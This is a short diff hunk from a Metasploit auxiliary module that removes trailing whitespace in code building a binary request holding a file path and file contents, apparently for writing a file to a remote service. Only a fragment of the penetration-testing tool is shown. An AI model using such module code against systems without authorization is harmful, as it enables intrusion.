@@ -121,14 +121,14 @@ class MetasploitModule < Msf::Auxiliary
     begin
       data = [0xaa].pack('N')
       data << [0xbb].pack('N')
-      data << full_path + "\x00"        
-      data << "file_type\x00"           
+      data << full_path + "\x00"
+      data << "file_type\x00"
       data << "unk_str3\x00"
       data << "unk_str4\x00"
-      data << [file_data.length].pack('N')  
       data << [file_data.length].pack('N')
-      data << file_data  
-      data.force_encoding('ASCII-8BIT') 
+      data << [file_data.length].pack('N')
+      data << file_data
+      data.force_encoding('ASCII-8BIT')
 
       req = mk_msg(38, 0x0021, data)
     rescue StandardError => e
